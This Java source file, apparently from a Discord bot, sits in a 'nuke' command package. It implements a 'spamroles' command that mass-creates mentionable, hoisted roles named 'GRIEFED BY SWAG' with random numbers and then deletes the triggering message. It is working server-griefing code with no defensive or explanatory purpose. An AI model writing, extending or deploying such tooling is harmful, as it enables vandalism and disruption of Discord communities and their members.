package me.comu.exeter.commands.nuke;

import me.comu.exeter.core.Core;
import me.comu.exeter.interfaces.ICommand;
import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.events.message.guild.GuildMessageReceivedEvent;

import java.util.Arrays;
import java.util.List;
import java.util.Random;

public class SpamRolesCommand implements ICommand {


    @Override
    public void handle(List<String> args, GuildMessageReceivedEvent event) {
        if (!(event.getAuthor().getIdLong() == Core.OWNERID )) {
            return;
        }
        int input;
        try {
            input = Integer.parseInt(args.get(0));
        } catch (NumberFormatException ex) {
            event.getChannel().sendMessage("Please insert a number for the argument").queue();
            return;
        }
        for (int i = 0; i < input; i++) {
            event.getGuild().createRole().setHoisted(true).setMentionable(true)
                    .setName("GRIEFED BY SWAG " + Integer.toString(this.getRandom())).queue();
            if (i == input - 1) {
                event.getMessage().delete().queue();
//                List<Message> messages = event.getChannel().getHistory().retrievePast(2).queue();
//                event.getChannel().deleteMessages(messages).queue();
//                event.getChannel().sendMessage("Roles created").queue();
            }
        }
    }

    @Override
    public String getHelp() {
        return "Spam creates the specified amount of roles\n`" + Core.PREFIX + getInvoke() + "` [amount]\nAlises: `" + Arrays.deepToString(getAlias()) + "`";
    }

    @Override
    public String getInvoke() {
        return "spamroles";
    }

    @Override
    public String[] getAlias() {
        return new String[] {"addroles","rolescreate"};
    }

    public int getRandom() {
        Random randy = new Random();
        return randy.nextInt();
    }
}
